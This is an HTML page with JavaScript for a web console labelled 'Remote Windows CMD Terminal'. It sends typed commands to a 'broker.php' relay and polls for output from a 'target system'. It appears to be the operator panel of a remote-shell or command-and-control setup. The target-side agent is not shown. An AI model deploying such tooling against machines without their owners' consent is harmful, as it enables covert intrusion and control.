<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Web Command Console</title>
    <style>
        body { background-color: #121212; color: #00FF00; font-family: monospace; padding: 20px; }
        #terminal { width: 100%; height: 400px; background-color: #000; border: 1px solid #333; padding: 10px; overflow-y: scroll; white-space: pre-wrap; box-sizing: border-box; margin-bottom: 10px; }
        #cmdInput { width: 80%; background: #222; border: 1px solid #555; color: #fff; padding: 10px; font-family: monospace; }
        #sendBtn { width: 18%; padding: 10px; background: #00FF00; color: #000; font-weight: bold; cursor: pointer; border: none; }
    </style>
</head>
<body>

    <h2>Remote Windows CMD Terminal</h2>
    <div id="terminal">Waiting for target system...</div>
    
    <input type="text" id="cmdInput" placeholder="Type a command (e.g., ipconfig, dir, whoami) and press Enter..." />
    <button id="sendBtn" onclick="sendCommand()">Execute</button>

    <script>
        // Check for new terminal outputs every 1 second
        setInterval(fetchOutput, 1000);

        function fetchOutput() {
            fetch('broker.php?action=get_output')
                .then(response => response.text())
                .then(data => {
                    if(data.trim() !== "") {
                        const term = document.getElementById('terminal');
                        // DECODE THE URL STRING: Vital to turn %20 and %0A back into spaces and lines
                        term.innerText += decodeURIComponent(data);
                        term.scrollTop = term.scrollHeight; // Auto scroll to bottom
                    }
                });
        }

        function sendCommand() {
            const inputField = document.getElementById('cmdInput');
            const command = inputField.value;
            if(!command) return;

            fetch('broker.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'command=' + encodeURIComponent(command)
            }).then(() => {
                inputField.value = ''; // Clear input field
            });
        }

        // Allow pressing Enter key to send command
        document.getElementById('cmdInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') sendCommand();
        });
    </script>
</body>
</html>
